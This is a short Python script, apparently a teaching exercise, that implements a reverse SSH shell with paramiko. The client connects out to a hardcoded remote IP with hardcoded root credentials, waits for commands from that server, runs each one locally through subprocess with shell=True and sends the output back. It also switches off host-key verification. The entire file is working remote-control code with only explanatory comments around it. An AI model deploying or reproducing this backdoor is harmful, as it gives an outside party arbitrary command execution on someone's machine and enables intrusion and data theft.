#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Normally when using SSH, you use an SSH client to
connect to an SSH server, but because Windows doesn’t
include an SSH server out-of-the-box, we need to reverse
this and send commands from our SSH server to the SSH client.
"""

import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
	client = paramiko.SSHClient()
	#client.load_host_keys('/home/nc/.ssh/known_hosts')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip,username=user,password=passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(command) # Send 'ClientConnect' message to server
		print(ssh_session.recv(1024)) # Read banner in return
		while True:
			command = ssh_session.recv(1024) # Get the command from the SSH server
			command = command.decode("utf-8")
			try:
				cmd_output = subprocess.check_output(command, shell=True) # Execute the command locally and store the output
				ssh_session.send(cmd_output) # Send the output to the server
			except Exception as e:
				print(str(e))
				ssh_session.send(str(e))
		client.close()
	return

ssh_command('192.30.32.122','root','aapl','ClientConnected')  # IP = where our server is running

# We send the ClientConnect command first, send the banner back to the server,
# then we enter the while loop where the client waits for the server to send
# a command, executes it, and sends the output back to the server.
# The server/client roles are inversed here because Windows doesn't have an SSH server built-in.	